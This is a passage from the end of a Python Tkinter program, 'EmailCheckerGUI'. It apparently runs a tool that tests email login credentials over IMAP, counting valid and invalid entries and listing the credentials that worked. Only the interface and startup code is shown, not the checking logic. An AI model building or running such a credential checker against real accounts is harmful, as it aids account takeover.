        self.errors_var.set(str(results['errors']))
        
        # Update progress bar
        total = results['total']
        if total > 0:
            completed = results['valid'] + results['invalid'] + results['errors']
            progress = (completed / total) * 100
            self.progress_var.set(progress)
        
        # Update results text
        if results['valid'] > 0 and self.checker.valid_credentials:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, "\n".join(self.checker.valid_credentials))
    
    def log_message(self, message):
        """Log a message to the log text area"""
        # Get current time
        current_time = time.strftime("%H:%M:%S")
        
        # Add message to log
        self.log_text.insert(tk.END, f"[{current_time}] {message}\n")
        self.log_text.see(tk.END)  # Scroll to end

def main():
    """Main function to run the app"""
    # Check for required libraries first
    missing_libs = []
    
    try:
        import imaplib
    except ImportError:
        missing_libs.append("imaplib")
        print("imaplib not found. IMAP support might be limited.")
    
    # Initialize the application
    root = tk.Tk()
    app = EmailCheckerGUI(root)
    
    # Show warning for missing libraries
    if missing_libs:
        message = "The following libraries are missing and some features may be limited:\n"
        message += ", ".join(missing_libs)
        message += "\n\nRecommended: Install them using pip."
        messagebox.showwarning("Missing Libraries", message)
    
    root.mainloop()

if __name__ == "__main__":
    main()